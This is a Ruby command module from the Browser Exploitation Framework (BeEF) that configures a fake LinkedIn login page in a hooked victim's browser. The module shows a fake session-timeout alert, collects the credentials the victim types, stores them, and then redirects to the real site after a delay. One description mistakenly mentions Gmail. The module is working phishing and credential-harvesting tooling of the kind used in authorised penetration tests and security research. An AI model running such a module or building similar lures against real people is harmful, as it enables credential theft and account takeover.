#
# Copyright (c) 2006-2019 Wade Alcorn - wade@bindshell.net
# Browser Exploitation Framework (BeEF) - http://beefproject.com
# See the file 'doc/COPYING' for copying permission
#
class Linkedin < BeEF::Core::Command

  def self.options
     redirect_url = "https://linkedin.com"
     wait_seconds_before_redirect = 1000
     alert_message = 'Woops!! Your LinkedIn session timed out'

     return [
        {'name' => 'redirect_url', 
         'description' => 'Redirects the user to a particular webpage after the credentials have been harvested',
         'ui_label' => 'Redirect URL (Optional)',
         'value' => redirect_url,
         'width' => '300px' 
        },
        {
          'name' => 'alert_message',
          'description' => 'Alert message that the user gets when linkedin page appears',
          'ui_label' => 'Alert message on phishing webpage',
          'value' => alert_message,
          'width' => '500px'
        },
        {
         'name' => 'wait_seconds_before_redirect', 
         'description' => 'When the user submits his credentials on the phishing page, we have to wait (in ms) before we redirect to the real Gmail page, so that BeEF gets the credentials in time.',
         'ui_label' => 'Redirect delay (ms)',
         'value' => wait_seconds_before_redirect,
         'width' => '100px' 
        }
        ]
   end

  def post_execute
    content = {}
    content['Result'] = @datastore['result']
    save content

  end

end
